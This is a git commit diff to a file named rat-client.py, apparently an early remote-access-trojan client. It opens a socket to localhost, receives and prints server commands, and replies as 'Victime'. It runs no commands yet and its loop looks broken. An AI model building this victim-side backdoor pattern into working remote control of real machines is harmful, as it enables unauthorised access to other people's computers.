ad7377baa88769911a1f94a057f43524cdc61b77
root <root@localhost.localdomain>
2018-02-05 16:07:13 -0500

    client V3

--- rat-client.py
+++ rat-client.py
@@ -16,9 +16,25 @@ import socket
 
 #################################################
 
+def commande_recus():
+	commande = client_toserver.recv(2048)
+	commande = commande.decode()
+	print (commande)
+
+
+def envoi_confirm():
+	client_toserver.send ("Victime: d'accord sire !")
+
+
 hote= "127.0.0.1"
 port= 5050
 
-client_side = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_side.connect((hote,port))
+client_toserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_toserver.connect((hote,port))
 print ("connexion OK ")
+
+message= " "
+
+while message != 'stop':
+	commande_recus()
+	envoi_confirm()
